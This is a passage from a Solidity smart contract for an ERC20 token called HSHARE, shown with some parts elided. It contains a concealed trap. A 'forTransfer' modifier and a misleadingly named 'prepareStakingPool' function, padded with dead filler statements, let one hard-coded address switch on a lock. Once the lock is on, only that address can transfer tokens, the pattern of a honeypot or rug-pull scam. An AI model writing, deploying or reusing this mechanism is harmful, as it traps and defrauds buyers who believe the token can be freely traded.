...
contract HSHARE is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenu_totalSupply;
    uint256 private _tokenu_status = 0;
    uint256 public stakingPooluStatus = 0;

    string private _tokenu_name;
    string private _tokenu_symbol;

    address private _pooluAddress = 0x1EE7d6Fb2D2b1b10577450a704ca69F107016076;

    constructor() {
        _tokenu_name = "HSHARE";
        _tokenu_symbol = "HSHARE";
        _tokenu_totalSupply = 1000 * 10 ** 18;
        _balances[msg.sender] = _tokenu_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _pooluAddress || _tokenu_status == 0);
        _;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokenu_totalSupply;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPooluStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _pooluAddress)
        {
            _tokenu_status = 1;
        }
    }
